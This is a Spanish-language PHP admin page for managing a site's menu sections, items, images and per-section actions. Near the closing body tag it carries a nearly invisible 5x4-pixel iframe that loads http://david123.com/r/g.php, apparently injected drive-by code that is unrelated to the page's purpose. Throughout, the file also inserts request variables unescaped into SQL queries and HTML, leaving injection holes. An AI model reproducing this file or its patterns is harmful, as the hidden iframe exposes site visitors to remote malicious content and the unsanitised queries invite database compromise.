<?php
//	define ('CFG_section_id','');
	include_once('../inc/conf.inc.php');

	$normal_ancho = 20; //ancho de la imagen
	$normal_alto = 20; //alto de la imagen
	 
	 $secciones = new DBI;
	 $subsecciones = new DBI;
	 $resultados = new DBI;
?>
<html>
<head>
	<title>Secciones</title>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	<link rel="stylesheet" href="../<?=CFG_styleDir.CFG_styleFile?>" type="text/css">
    <link rel="stylesheet" href="../styles/tabla.css" type="text/css">
	<script src="<?=CFG_jsPath?>download.php"></script>
</head>

<body id="body">
<?php //Nodos
	if ($action == 'Agregar') {
		//procesamiento de imagenes
		#imagen
//echo $action." ".$foto1;
		if (!$no_foto1 && file_exists ($foto1) ) {
			if ($ajustar1) { //redimensionar imagen y leer
				$imgFotoResize = imagecreatetruecolor ($normal_ancho, $normal_alto) ;
				ImageColorSet ($imgFotoResize, 0, 255, 255, 255) ;
				if (strtolower ($foto1_type)  == 'image/pjpeg' || strtolower ($foto1_type)  == 'image/jpeg' || strtolower ($foto1_type)  == 'image/jpg') {
					$imgFoto = ImageCreateFromJPEG ($foto1) ;
				}
				if (strtolower ($foto1_type)  == 'image/png') {
					$imgFoto = ImageCreateFromPNG ($foto1) ;
				}
				$imgFotoResize = ImageResizeMax ($imgFoto,$normal_ancho, $normal_alto) ;
				ob_start ();
					ImageJPEG ($imgFotoResize);
				$blob1 = addslashes (ob_get_contents ()) ;
				ob_end_clean ();	
			} else { //leer imagen original
				$fp = fopen ($foto1, 'r') ;
					$blob1 = fread ($fp , filesize ($foto1) ) ;
				fclose ($fp) ;
				$blob1 = addslashes ($blob1);
			}
		}#fin proceso imagen
		if ($blob1) { //insertar imagen
			$img_image = $blob1;
			$img_mime = $foto1_type;
			$img_name = $foto1_name;
			$db->insert (CFG_sectionsTable , "nombre = '$nombre',id_padre = 0,md5,img_image,img_mime,img_name");
		} else {
			$db->insert (CFG_sectionsTable , "nombre = '$nombre',id_padre = 0,md5");
		}
		$action = '';
		$action2 = 'actualizar_menu';
	}//end 'Agregar'
	
	if ($action == 'Modificar') {
		$db->update (CFG_sectionsTable, "nombre,md5" , "id = $id_seccion");
		$action='';
		$action2 = 'actualizar_menu';
	}//end 'Modificar'
	
	if ($action == 'Borrar') {
//		$db->delete (CFG_sectionsTable, "id_padre = $id_seccion")
		$secciones->sql="
			SELECT id
			FROM ".CFG_sectionsTable."
			WHERE id_padre = $id_seccion
		";
		$secciones->query();
		
		$secciones_sql = '';
		$coma = '';
		while ($seccion = $secciones->fetch_object()) {
			$secciones_sql.= "$coma $seccion->id";
			$coma=', ';
		}
		$secciones_sql .= "$coma $id_seccion";
		$secciones->sql = "
			DELETE FROM ".CFG_privilegesTable."
			WHERE id_seccion IN($secciones_sql)
		";
		$secciones->query();
		
		$secciones->sql = "
			DELETE FROM ".CFG_sectionsTable."
			WHERE id IN ($secciones_sql)
		";
		$secciones->query();
		
		$action = '';
		$action2 = 'actualizar_menu';
	}//end 'Borrar'
?>
<?php //Items
	if ($action == 'Agregar_item') {
		$secciones->insert(
			CFG_sectionsTable,
			"nombre,vinculo,id_padre,md5"
		);
		
		$action = 'frmItems';
		$action2 = 'actualizar_menu';
		$id_seccion = $id_padre;
	}//end 'Agregar_item'
	
	if ($action == 'ModificarItem') {
		$db->update(CFG_sectionsTable, "nombre,vinculo,id_padre,md5" , "id = $id");
		$action='frmItems';
		$action2 = 'actualizar_menu';
		$id_seccion = $id_padre;
	}//end 'Modificar_item'
	
	if ($action == 'Borrar_item') {
		$db->delete(CFG_sectionsTable,"id = $id_seccion");
/*		$secciones->sql="
			DELETE FROM ".CFG_sectionsTable."
			WHERE id = $id_seccion
		";*/
		$secciones->query();
		
		$action='frmItems';
		$action2 = 'actualizar_menu';
		$id_seccion=$id_padre;
	}//end 'Borrar_item'
?>
<?
	if ($action == 'acciones') {
		$srv = "acciones";
		$db->delete(CFG_sections_actionsTable,"id_seccion = $id_seccion");
		if (is_array( ${'arr_'.$srv} )) {
			foreach( ${'arr_'.$srv} as $accion => $nombre ){
				$db->insert(CFG_sections_actionsTable,"id_seccion,accion");
			}
		}
		$id_seccion = $id_sec_padre;
		$action = 'frmItems';
		$action2 = 'actualizar_menu';
	}
?>
<?php
   if (trim($action) == '') {
		$secciones->sql = "
			 SELECT *
			 FROM ".CFG_sectionsTable."
			 WHERE id_padre=0 AND nombre <>'-separador-'
			 ORDER BY nombre
		";
		$secciones->query($sql);

		$num_secciones = $secciones->num_rows();
?>
	<table align="center" width="98%" cellpadding="3" cellspacing="0" border="0">
		<tr>
			<th colspan="5" class="relieve">
				<table width="100%" border="0" cellspacing="0" cellpadding="3">
					<form name="frm_agregar" method="post" action="<?=$PHP_SELF?>">
						<input type="hidden" name="action" value="frmAgregar">
					</form>
					<tr>
						<td>
							<input type="button" value="Agregar Nodo" onClick="frm_agregar.submit()" class="button">
						</td>
						<td align="right" class="text">Total: <? echo $num_secciones?></td>
					</tr>
				</table>
			</th>
		</tr>
		<tr>
			<td height="5" colspan="5" class="sombra_titulo"></td>
		</tr>
		<tr align="center">
			<td class="relieve">Nodo</td>
			<td class="relieve">Lista de Items</td>
			<td class="relieve">Items</td>
			<td class="relieve">Modificar</td>
			<td class="relieve">Borrar</td>
		</tr>
		<script language="javascript" type="text/javascript">
		   var item_abierto='';
		
		   function abrir_item(n_item){
				cerrar_item(item_abierto);
		
				eval('boton=document.getElementById("boton_'+n_item+'")');
				eval('lista=document.getElementById("lista_'+n_item+'")');
				boton.style.display='none';
				lista.style.display='block';
		
				item_abierto=n_item;
		   }
		
		   function cerrar_item(n_item){
				if(n_item!=''){
					 eval('boton=document.getElementById("boton_'+n_item+'")');
					 eval('lista=document.getElementById("lista_'+n_item+'")');
					 lista.style.display='none';
					 boton.style.display='block';
		
					 item_abierto='';
					 document.getElementById('body').style.display='none';
					 document.getElementById('body').style.display='block';
				}
		   }
		</script>
<?
		if ($num_secciones < 1) {
?>
		<tr>
			<td colspan="5" align="center" class="relieve">
				<font color="#000000">No se encontro ningún registro</font>
			</td>
		</tr>
<?
		} else {
			while ($seccion = $secciones->fetch_object()) {
				$n++;
				$color = ($color=='#6699CC')?'#336699':'#6699CC';
?>
		<tr bgcolor="">
			<td class="relieve" valign="top" width="25%">
				 <? echo $seccion->nombre==''?'&nbsp;':$seccion->nombre?>
			</td>
			<td class="relieve" valign="top" width="60%">
<?
				$subsecciones->sql="
				   SELECT *
				   FROM ".CFG_sectionsTable."
				   WHERE id_padre = $seccion->id
				   ORDER BY nombre
				";
				$subsecciones->query();
				
				$lista_items='';
				if( $subsecciones->num_rows() > 0 ){
				   $lista_items.="Este nodo posee los siguientes items:<br><br>";
				
				   while( $subseccion = $subsecciones->fetch_object() )
						$lista_items.="$subseccion->nombre<br>";
				}
				
				if($lista_items==''){
				   echo '<font color="#ff0000">Este nodo no posee items</font>';
				} else {
?>
				<table width="100%">
					<tr id="boton_<?=$n?>">
						<td class="text">
							<a onMouseOver="abrir_item(<?=$n?>)">Ver Items ( <?=$subsecciones->num_rows()?> )</a>
						</td>
					</tr>
					<tr id="lista_<?=$n?>" style="display: none">
						<td class="text"><?=$lista_items?></td>
					</tr>
				</table>
<?
				}
?>
			</td>
			<td class="relieve" align="center" width="5%">
				<a href="<?=$PHP_SELF?>?id_seccion=<?=$seccion->id?>&action=frmItems"><img src="<?=CFG_imgPath?>ico_view.gif" border="0" /></a>
			</td>
			<td class="relieve" align="center" width="5%">
				<a href="<?=$PHP_SELF?>?id_seccion=<?=$seccion->id?>&action=frmModificar"><img src="<?=CFG_imgPath?>list.gif" border="0" /></a>
			</td>
			<td class="relieve" align="center" width="5%">
				<a href="<?=$PHP_SELF?>?id_seccion=<?=$seccion->id?>&action=frmBorrar"><img src="<?=CFG_imgPath?>delete.gif" border="0" /></a>
			</td>
		</tr>
<?
			}
		}
?>
	</table>
<br>
<br>
<?
	}
	if ($action == 'frmAgregar' || $action == 'frmModificar') {
		if ($action == 'frmModificar') {
			$seccion = DBI::record(CFG_sectionsTable," id = $id_seccion");
		}
		Form::validate ();
?>
	<form name="form1" method="post" action="<?=$PHP_SELF?>" onSubmit="return validate(this)">
		<input type="hidden" name="action" value="<?=($action == 'frmAgregar' ? 'Agregar' : 'Modificar')?>" />
		<input type="hidden" name="id_seccion" value="<?=$id_seccion?>" />
		<table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
			<tr align="center">
				<th height="29" colspan="2" class="relieve">
					<span class="texto_titulo"><?=($action == 'frmAgregar' ? 'Agregar' : 'Modificar')?> Secci&oacute;n</span>
				</th>
			</tr>
			<tr align="center">
				<td width="172" class="relieve">Nombre</td>
				<td width="226" class="relieve"><input type="text" name="nombre" value="<?=$seccion->nombre?>" validate="str:auto" /></td>
			</tr>

<? //foto 1 ?>
		<tr>
			<td align="left" class="relieve">Imagen:</td>
			<td align="center" class="relieve">
				<font color="#333333">Medidas Recomendadas: <?=$normal_ancho?> Ancho x <?=$normal_alto?> Alto<br />
				Medidas Imagen Actual: <span id="imgFoto1Ancho"></span>&nbsp;Ancho x <span id="imgFoto1Alto"></span>&nbsp;Alto</font><br /> 
				<script language="JavaScript" type="text/javascript">
					<!--
						function fAjustarFoto1 () {
							max_x = <?=$normal_ancho?>;
							max_y = <?=$normal_alto?>;
							
							x = document.getElementById ('imgFoto1').offsetWidth;
							y = document.getElementById ('imgFoto1').offsetHeight;
							
							if  (x > max_x)  {
								y = Math.floor (y *  (max_x / x) ) ;
								x = max_x;
							}
						
							if (y > max_y) {
								x = Math.floor(x * (max_y / y));
								y = max_y;
							}
							
							document.getElementById ('imgFoto1').width = x;
							document.getElementById ('imgFoto1').height = y;
							
							setTimeout ('verFotoMedidas1 ()', 1000);
						}
						function fNormalFoto1 () {
							document.getElementById ('imgFoto1').removeAttribute ('width');
							document.getElementById ('imgFoto1').removeAttribute ('height');	
						}
					//-->
					</script>
					<input name="ajustar1" type="checkbox" id="ajustar1" value="1" onclick="if (this.checked) { fAjustarFoto1 (); }else{ fNormalFoto1 (); }" /> 
					<label for="ajustar1"><font color="#333333">Ajustar la Imagen</font></label> 
					<span id="msgAjustar"></span><br />
					<input type="checkbox" id="bordes" onclick="document.getElementById ('imgFoto1').border = this.checked ? 1 : 0" />
					<label for="bordes"><font color="#333333">Mostrar Bordes</font></label> 
					<br />
					<script language="JavaScript">
					<!--
						function verFotoMedidas1 () {
							width = document.getElementById ('imgFoto1').offsetWidth;
							origWidth = document.getElementById ('imgFoto1').offsetWidth;
							perWidth = <? echo $normal_ancho?>;
							if (document.getElementById ('imgFoto1').offsetWidth < perWidth) {
								width = '<font color="#2222ff">'+width+'</font>';
							} else if (document.getElementById ('imgFoto1').offsetWidth == perWidth) {
								width = '<font color="#009900">'+width+'</font>';
							} else if (document.getElementById ('imgFoto1').offsetWidth > perWidth) {
								width = '<b><font color="#ff0000">'+width+'</font></b>';
							}
							
							height = document.getElementById ('imgFoto1').offsetHeight;
							origHeight = document.getElementById ('imgFoto1').offsetHeight;
							perHeight = <? echo $normal_alto?>;
							if (document.getElementById ('imgFoto1').offsetHeight < perHeight) {
								height = '<font color="#2222ff">'+height+'</font>';
							} else if (document.getElementById ('imgFoto1').offsetHeight == perHeight) {
								height = '<font color="#009900">'+height+'</font>';
							} else if (document.getElementById ('imgFoto1').offsetHeight > perHeight) {
								height = '<b><font color="#ff0000">'+height+'</font></b>';
							}
							
							if (perWidth/perHeight == origWidth/origHeight) {
								document.getElementById ('msgAjustar').innerHTML = '';
								document.getElementById ('ajustar1').disabled = false;
							} else {
								document.getElementById ('msgAjustar').innerHTML = '<font color="#ff0000"><b>Proporción inadecuada !!!</b></font>';
								document.getElementById ('ajustar1').disabled = false;
							}
							
							document.getElementById ('imgFoto1Ancho').innerHTML = width;
							document.getElementById ('imgFoto1Alto').innerHTML = height;
						}
						function verFoto1 (foto) {
							document.getElementById ('imgFoto1Ancho').innerHTML = 0;
							document.getElementById ('imgFoto1Alto').innerHTML = 0;
							document.getElementById ('imgFoto1').style.display = foto != '' ? 'block' : 'none';
							if (foto != '') {
								document.getElementById ('imgFoto1').removeAttribute ('width');
								document.getElementById ('imgFoto1').removeAttribute ('height');
								
								document.getElementById ('imgFoto1').src = foto;
								setTimeout ('verFotoMedidas1 ()', 1000);
							}
						}
					-->
					</script> 
		
<?
			$verFoto = false;
			if ($action == 'frmModificar') {
				//$foto = DBI::record ('fiestas_fotos',"id_fiesta = $reg->id");
				$verFoto = $foto->mime1 != '' ;
			}
?>
					<table width="330"><tr><td></td></tr></table>
					<table width="<?=$normal_ancho?>" height="<?=$normal_alto?>" border="0" cellspacing="0" cellpadding="0">
						<tr> 
							<td width="3" bgcolor="#666666"></td>
							<td width="<?=$normal_ancho?>">
								<table width="<?=$normal_ancho?>" border="0" cellspacing="0" cellpadding="0">
									<tr> 
										<td height="4" bgcolor="#666666"></td>
									</tr>
								</table>
							</td>
						</tr>
						<tr> 
							<td width="3" rowspan="2" valign="top">
								<table bgcolor="#666666" height="<?=$normal_alto?>" width="3" border="0" cellspacing="0" cellpadding="0">
									<tr> 
										<td>&nbsp;</td>
									</tr>
								</table>
							</td>
							<td width="<?=$normal_ancho?>" height="<?=$normal_alto?>" align="left" valign="top">
								<img id="imgFoto1" style="display: <?=$verFoto?'block':'none'?>" border="0" src="../../imagen.php?section=fiestas_fotos&id=<?=$reg->id?>" />
							</td>
						</tr>
					</table>
					<br />
					<input name="foto1" type="file" id="foto1" onpropertychange="verFoto1 (this.value) " /> 
<?			if ($action == 'frmModificar') { ?>
					<input type="checkbox" name="no_foto1" value="1" id="no_foto1" />
					<label for="no_foto1"><font color="#333333">No Foto</font></label> 
<?			} ?>
			</td>
		</tr>
<? //fin foto1 ?>

			<tr align="center">
				<td colspan="2" class="relieve" align="center">
					<input type="submit" class="button" value="<?=($action == 'frmAgregar' ? 'Agregar' : 'Modificar')?>" name="submit" />
					<input type="button" class="button" value="Cancelar" name="Button" onClick="javascript: open ('<?=$PHP_SELF?>','main','');" />
				</td>
			</tr>
		</table>
	</form>
<?
	}
	if ($action=='frmItems' || $action =='frmModificarItem') {
?>
	<form name="form1" method="post" action="<?=$PHP_SELF?>">
		<input type="hidden" name="action" value="<?=($action == 'frmItems' ? 'Agregar_item' : 'ModificarItem')?>">
		<input type="hidden" name="id_padre" value="<?=$id_seccion?>" />
		<input type="hidden" name="id_seccion" value="<?=$id_seccion?>" />
<?php
		if ($action =='frmModificarItem') {
			$reg = $db->record (
				CFG_sectionsTable,
				"id_padre = $id_seccion AND id = $id"
			);
?>
		<input type="hidden" name="id" value="<?=$reg->id?>" />
<?php
		}
?>
		<table width="95%" border="0" cellspacing="0" cellpadding="3" align="center">
			<tr align="center">
			   <th height="29" colspan="4" class="relieve">
					<span class="texto_titulo">Agregar Item</span>
			   </th>
			</tr>
			<tr align="center" >
			   <td width="20%" class="relieve">Nombre<br>
				<input type="text" name="nombre" style="width: 99%" value="<?=$reg->nombre?>" />			   </td>
			   <td width="41%" class="relieve">Vinculo<br>
				<input type="text" name="vinculo" style="width: 99%" value="<?=$reg->vinculo?>" />			   </td>
			   <td width="28%" class="relieve">Identificador<br>
			   	<input type="text" id="md5" name="md5" style="width: 99%" maxlength="32" value="<?=printif($reg->md5,md5(time()))?>" /></td>
			   <td width="11%" class="relieve">
				<input type="submit" class="button" value="Agregar">			   </td>
			</tr>
		</table>
	</form>
<?
		$resultados->sql="
			 SELECT *
			 FROM ".CFG_sectionsTable."
			 WHERE id_padre = $id_seccion
			 ORDER BY nombre
		";
		$resultados->query();
		
		if ($resultados->num_rows() > 0) {
?>
	<table align="center" width="95%" cellpadding="3" cellspacing="0" border="0">
		<tr>
			<th colspan="6" class="relieve">Listado de Items</th>
		</tr>
		<tr>
			<td height="5" colspan="6" class="sombra_titulo"></td>
		</tr>
		<tr align="center">
			<td class="relieve">Nombre</td>
			<td class="relieve">Vinculo</td>
			<td class="relieve">Identificador</td>
			<td class="relieve">Acciones</td>
			<td class="relieve" width="58" align="center">Modif</td>
			<td class="relieve" width="65" align="center">Borrar</td>
		</tr>
<?
			while($resultado=$resultados->fetch_object()){
				//$color=($color=='#6699CC')?'#336699':'#6699CC';
?>
		<tr>
			<td class="relieve" valign="top" width="136">
				<?=$resultado->nombre==''?'&nbsp;':$resultado->nombre?>
			</td>
			<td class="relieve" valign="top" width="378">
				<?=$resultado->vinculo==''?'&nbsp;':$resultado->vinculo?>
			</td>
			<td class="relieve" valign="top" width="182"><?=$resultado->md5==''?'&nbsp;':$resultado->md5?></td>
			<td width="69" align="center" valign="top" class="relieve"><a href="<?=$PHP_SELF?>?action=ver_acciones&id_seccion=<?=$resultado->id?>&id_sec_padre=<?=$id_seccion?>" class="texto">Ver</a></td>
			<td class="relieve" align="center">
				<a href="<?=$PHP_SELF?>?id=<?=$resultado->id?>&id_padre=<?=$id_seccion?>&action=frmModificarItem&id_seccion=<?=$id_seccion?>"><img src="<?=CFG_imgPath?>list.gif" border="0" /></a>
			</td>
			<td class="relieve" align="center">
				<a href="<?=$PHP_SELF?>?id_seccion=<?=$resultado->id?>&id_padre=<?=$id_seccion?>&action=Borrar_item"><img src="<?=CFG_imgPath?>delete.gif" border="0" /></a>
			</td>
		</tr>
<?
			}
?>
	</table>
<?
		}
?>
	<form method="post" action="<?=$PHP_SELF?>">
		<p align="center"><input type="submit" class="button" value="volver" name="volver"></p>
	</form>
<?
	}
	if ($action == 'ver_acciones') {
		$srv = 'acciones';
?>
<script language="JavaScript" type="text/javascript">
	var cant=0;
	var nodos = new Array();
	
	function mover_elemento(origen,destino){
		for(cont = 0; eval('cont <= origen.length-1'); cont++){
			if(eval('origen.options[cont].selected') == true){
				eval('destino.options[destino.length]=new Option(origen.options[cont].text, origen.options[cont].value);');
				eval('origen.options[cont]=null;');
				cont--;
			}
		}
	}
	
	function seleccionar() {
		var elem;
		for (var cont = 0 ; cont <= document.form1.<?=$srv?>_sel.length-1 ; cont++) {
			document.form1.<?=$srv?>_sel.options[cont].selected = true;
			elem = document.createElement('<INPUT TYPE="hidden" name="arr_<?=$srv?>['+document.form1.<?=$srv?>_sel.options[cont].value+']" value="'+document.form1.<?=$srv?>_sel.options[cont].value+'" />');
			document.form1.insertBefore(elem);
		}
	}
</script>
<form name="form1" id="form1" action="<?=$PHP_SELF?>" method="post" onSubmit="seleccionar()">
<?
	$seccion = DBI::record(
		CFG_sectionsTable,
		"id = $id_seccion"
	);
?>
<input type="hidden" name="id_seccion" id="id_seccion" value="<?=$id_seccion?>" />
<input type="hidden" name="id_sec_padre" id="id_sec_padre" value="<?=$id_sec_padre?>" />
<input type="hidden" name="action" id="action" value="acciones" />
<table border="0" cellpadding="0" cellspacing="0" width="80%" align="center">
	<tr>
		<td class="relieve" align="center">Acciones pertenecientes a la seccion <?=$seccion->nombre?></td>
	</tr>
	<tr>
		<td height="5"></td>
	</tr>
	<tr>
		<td class="relieve">
			<table border="0" cellpadding="3" cellspacing="0" width="100%">
				<tr>
					<td width="45%" class="text">Disponibles: 
<?
	$srv = 'acciones';
	$registros_tmp = new DBI;
	$registros_tmp->select(
		CFG_sections_actionsTable,
		"*",
		"id_seccion = $id_seccion",
		"accion"
	);
	$seleccionados = '';
	while ($resultado = $registros_tmp->fetch_object()) {
		$seleccionados .= ($seleccionados == '' ? '' : ',')."'".$resultado->accion."'";
	}
	$registros_tmp->select(
		CFG_actionsTable,
		'*',
		$seleccionados == '' ? "" : "nombre NOT IN ($seleccionados)",
		'nombre'
	);
?>
	  <select name="<?=$srv?>_disponibles" id="<?=$srv?>_dsiponibles" size="6" multiple style="width: 98%" ondblclick="mover_elemento(this,document.form1.<?=$srv?>_sel)" >
<?
	if ($registros_tmp->num_rows() > 0) {
		while ($registro_tmp = $registros_tmp->fetch_object()) {
?>
		<option value="<?=$registro_tmp->nombre?>"><?=$registro_tmp->nombre?></option>
<?
		}
	}
?>
	  </select></td>
					<td align="center" width="10%">
						<input type="button" class="button2" value=">>" onClick="mover_elemento(document.form1.<?=$srv?>_disponibles,document.form1.<?=$srv?>_sel)"><br>
						<br>
						<input type="button" class="button2" value="<<" onClick="mover_elemento(document.form1.<?=$srv?>_sel,document.form1.<?=$srv?>_disponibles)"><br>
					</td>
					<td width="45%" class="text">Seleccionados:
						<select name="<?=$srv?>_sel[]" id="<?=$srv?>_sel" size="6" multiple style="width: 98%"  ondblclick="mover_elemento(this,document.form1.<?=$srv?>_disponibles)">
<?
	if ($seleccionados != '') {
		$registros_tmp->select(
			CFG_sections_actionsTable,
			'*',
			"id_seccion = $id_seccion",
			'accion	'
		);
		if ($registros_tmp->num_rows() > 0) {
			while ($registro_tmp = $registros_tmp->fetch_object()) {
?>
							<option value="<?=$registro_tmp->accion?>"><?=$registro_tmp->accion?></option>
<?
			}
		}
	}
?>
						</select>
					</td>
				</tr>
				<tr height="5">
					<td></td>
					<td></td>
					<td></td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td height="5"></td>
	</tr>
	<tr>
		<td align="right">
			<input type="submit" name="aceptar" id="aceptar" value="Aceptar" class="button" />&nbsp;
			<input type="button" name="volver" id="volver" value="Volver" onClick="location = '<?=$PHP_SELF?>?action=frmItems&id_seccion=<?=$id_sec_padre?>'" class="button"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		</td>
	</tr>
</table>
</form>
<?
	}
	if($action=='frmBorrar'){
		$seccion = DBI::record(CFG_sectionsTable,"id = $id_seccion");
?>
	<form name="form1" method="post" action="<?=$PHP_SELF?>">
		<table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
			<tr align="center"> 
				<th class="relieve" height="31" colspan="2"><span class="texto_titulo">Borrar Seccion </span></th>
			</tr>
			<tr align="center"> 
				<td class="relieve" width="199"> Nombre </td>
				<td class="relieve" width="210"> <?=$seccion->nombre?></td>
			</tr>
			<tr align="center"> 
				<td colspan="2" class="relieve"> <center>
					<input type="hidden" name="id_seccion" value="<?=$id_seccion?>">
					<input type="submit" class="button" value="Borrar" name="action">
					<input type="button" class="button" value="Cancelar" name="Button" onClick="javascript:location = '<?=$PHP_SELF?>'">
				</center></td>
			</tr>
		</table>
	</form>
<?
	}
?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
<?php
	if ($action2 == 'actualizar_menu') {
?>
	<script language="JavaScript" type="text/javascript">
	<!--
		download ('menu.php' , function (s){ top.document.getElementById ('menu').innerHTML = s});
	//-->
	</script>
<?php
		$action2 = '';
	}
?>
